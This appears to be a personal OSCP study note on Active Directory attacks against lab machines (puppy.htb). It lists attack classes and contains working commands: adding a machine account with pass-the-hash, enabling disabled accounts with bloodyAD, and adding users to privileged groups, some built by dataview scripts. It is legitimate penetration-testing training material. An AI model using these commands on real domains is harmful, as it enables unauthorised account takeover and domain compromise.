[[ACL Abuse]]
1. [[GenericAll]]
2. [[GenericWrite]]
3. [[WriteDACL]]
4. [[WriteOwner]]
5. [[ForceChangePassword]]


AD Exploitation
1. [[CoerceToTGT]]
2. [[RBCD]]
3. [[GPO Abuse]]
4. [[DCSync]]
5. [[Shadow Credentials]]

## Active Directory attacks

A. ACL abuse

- GenericAll
    
- GenericWrite
    
- WriteDACL
    
- WriteOwner
    
- ForceChangePassword
    
- Shadow Credentials
    
- RBCD (when abusing relevant object permissions)
    

B. Account manipulation

- Add computer account (`impacket-addcomputer`)
    
- Enable disabled account (`bloodyAD remove uac`)
    
- Change/reset passwords
    
- Modify account attributes
    

C. Group privilege abuse

- Account Operators
    
- Backup Operators
    
- Server Operators
    
- DnsAdmins
    

D. Kerberos attacks

- AS-REP Roasting
    
- Kerberoasting
    
- Pass-the-Ticket
    
- Unconstrained Delegation
    
- Constrained Delegation
    
- RBCD
    
- Shadow Credentials / PKINIT
    

E. Domain replication attacks

- DCSync
    
- DCsync rights abuse
    

F. Group Policy abuse

- GPO permissions abuse
    
- Malicious GPO modification
    
- GPO-based privilege escalation

Password reset
`net rpc`

Add group member
`net rpc`

Shadow Credentials
`certipy-ad`

If Fail VV
RBCD

`impacket` / `rbcd.py`

WriteDACL / WriteOwner
`impacket-dacledit` / `bloodyAD`

DCSync
`impacket-secretsdump`


EvilwinRM into their new creds

---

---

## Make a new account
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";

const command = `impacket-addcomputer ${discoveredDomain}/[adminUser] -dc-ip ${ip} -hashes :[hash] -computer-name 'ATTACKER$' -computer-pass 'Attacker123'`

dv.paragraph("```bash\n" + command + "\n```");
```
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
[*] Successfully added machine account ATTACKER$ with password Attacker123.

---
## Enable account

```
bloodyAD -u [adminUser] -p '[adminPW]' --host dc.puppy.htb -d puppy.htb remove uac [targetUser] -f ACCOUNTDISABLE
```


---

## Abuse the `Account Operators` permissions

Add an account into this vulnerable group using `GenericAll` to progress to the next step

```
net user Retric pass123 /add /domain  
```

To check : 
```
net users
```

![[Pasted image 20260911174745.png]]

A Group Name:: Exchange Windows Permissions
```dataviewjs
const page = dv.page("Synced OSCP Notes/Small Toolkit/Tools/Active Directory/Bloodhound");
const AGroupName = page?.["A Group Name"] ?? "NO GROUP NAME FOUND";

const command = `net group "${AGroupName}" Retric /add`;

dv.paragraph("```bash\n" + command + "\n```");
```
To check : 
```dataviewjs
const page = dv.page("Synced OSCP Notes/Small Toolkit/Tools/Active Directory/Bloodhound");
const AGroupName = page?.["A Group Name"] ?? "NO GROUP NAME FOUND";

const command = `net group "${AGroupName}"`;

dv.paragraph("```bash\n" + command + "\n```");
```

![[Pasted image 20260911174809.png]]







